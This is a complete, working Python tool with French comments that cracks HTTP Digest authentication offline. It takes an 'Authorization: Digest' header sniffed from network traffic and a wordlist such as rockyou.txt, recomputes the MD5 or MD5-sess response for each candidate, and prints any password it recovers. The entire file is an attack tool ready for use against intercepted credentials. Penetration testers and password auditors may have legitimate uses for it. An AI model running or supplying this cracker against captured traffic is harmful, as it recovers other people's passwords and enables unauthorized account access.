#!/usr/bin/env python3
"""
digest_crack.py — cassage hors-ligne d'une authentification HTTP Digest (RFC 2617/2069).
À partir d'un header 'Authorization: Digest ...' capturé (sniff réseau) et d'une wordlist,
retrouve le mot de passe en recalculant le champ 'response'.

Usage:
  digest_crack.py -H 'Authorization: Digest username="fasm", realm="prive", ...' -w rockyou.txt
  digest_crack.py -H @header.txt -w rockyou.txt -m GET
Gère: qop=auth / absent (RFC2069), algorithm=MD5 / MD5-sess.
"""
import argparse, hashlib, re, sys

def md5(s): return hashlib.md5(s.encode("utf-8", "surrogateescape")).hexdigest()

def parse_header(raw):
    raw = raw.split("Digest", 1)[-1]  # on jette 'Authorization: Digest'
    d = {}
    for k, v in re.findall(r'(\w+)=("[^"]*"|[^,]+)', raw):
        d[k.strip()] = v.strip().strip('"')
    return d

def compute(p, pw, method):
    HA1 = md5(f"{p['username']}:{p['realm']}:{pw}")
    if p.get("algorithm", "MD5").lower() == "md5-sess":
        HA1 = md5(f"{HA1}:{p['nonce']}:{p['cnonce']}")
    HA2 = md5(f"{method}:{p['uri']}")
    if p.get("qop"):   # RFC 2617
        return md5(f"{HA1}:{p['nonce']}:{p['nc']}:{p['cnonce']}:{p['qop']}:{HA2}")
    return md5(f"{HA1}:{p['nonce']}:{HA2}")  # RFC 2069 (legacy)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-H", "--header", required=True, help="header Digest, ou @fichier")
    ap.add_argument("-w", "--wordlist", required=True)
    ap.add_argument("-m", "--method", default="GET")
    a = ap.parse_args()
    raw = open(a.header[1:], encoding="utf-8").read() if a.header.startswith("@") else a.header
    p = parse_header(raw)
    for req in ("username", "realm", "nonce", "uri", "response"):
        if req not in p: sys.exit(f"[!] champ manquant dans le header: {req}")
    target = p["response"].lower()
    with open(a.wordlist, encoding="latin-1") as f:
        for i, pw in enumerate(f, 1):
            pw = pw.rstrip("\n")
            if compute(p, pw, a.method) == target:
                print(f"[+] TROUVÉ -> {p['username']}:{pw}  (ligne {i})"); return
    print("[-] pas trouvé dans la wordlist")

if __name__ == "__main__":
    main()
